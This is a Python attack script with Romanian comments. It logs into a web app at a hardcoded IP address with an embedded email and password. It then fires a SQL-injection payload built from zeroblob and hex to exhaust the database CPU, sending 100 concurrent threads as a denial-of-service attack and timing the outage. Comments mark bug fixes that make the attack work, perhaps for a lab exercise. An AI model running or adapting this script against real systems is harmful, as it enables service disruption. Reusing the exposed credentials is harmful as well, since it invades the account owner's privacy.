import requests
import time 
import threading # CORECȚIE 1: Am importat librăria de multithreading

LOGIN_URL = "http://100.77.253.68:5000/login"
URL = "http://100.77.253.68:5000/tickets/search"
date = {"email": "diaconu_h@yahoo.com", "password": "Renault34"}

sesiune = requests.Session()

try:
    response = sesiune.post(LOGIN_URL, data=date)
    if response.status_code == 200:
        print("[*] Autentificare reusita")
    else:
        print(f"[-] Autentificare esuata cu codul {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"[-] Eroare la autentificare: {e}")

# CORECȚIE 2: Valoare redusă la 100M pentru a evita Integer Overflow și a bloca CPU-ul corect
payload_heavy = "test' OR (SELECT UPPER(HEX(replace(hex(zeroblob(100000000)), '0', 'A')))) LIKE '%"

print("[*] Cerere normala de control")
start_normal = time.time()
try:
    ressponse = sesiune.get(URL, params={"q": "test"}, timeout=5)
    print(f"[+] Cererea normala a raspuns cu codul {ressponse.status_code}")
except requests.exceptions.RequestException:
    print("[-] Cererea normala a depasit timpul de asteptare")
end_normal = time.time()
print(f"[i] Timpul de raspuns pentru cererea normala: {end_normal - start_normal:.2f} secunde")


# Definirea funcției care va fi rulată de fiecare fir în paralel
def thread_dos(id_fir):
    print(f"[+] Firul {id_fir} a inceput cererea DoS...")
    try:
        # Trimitem cererea grea
        res = sesiune.get(URL, params={"q": payload_heavy}, timeout=20)
        print(f"[✓] Firul {id_fir} a raspuns cu codul {res.status_code}")
    except requests.exceptions.RequestException:
        print(f"[!] Firul {id_fir} a depasit timpul de asteptare (Timeout)")

NUMAR_FIRE =100
lista_fire = []

print(f"\n[*] Se lansează {NUMAR_FIRE} cereri simultane către serverul multithreaded...")
start_dos = time.time()

# Creăm și pornim firele de execuție în paralel
for i in range(NUMAR_FIRE):
    # CORECȚIE 3: Am pus target=thread_dos pentru a se potrivi cu numele funcției de mai sus
    t = threading.Thread(target=thread_dos, args=(i,))
    lista_fire.append(t)
    t.start()

# Așteptăm ca toate firele să își termine execuția
# CORECȚIE 4: Am schimbat din 'list_fire' în 'lista_fire'
for t in lista_fire:
    t.join()

print(f"\n[i] Atacul concurent a durat în total: {time.time() - start_dos:.2f} secunde.")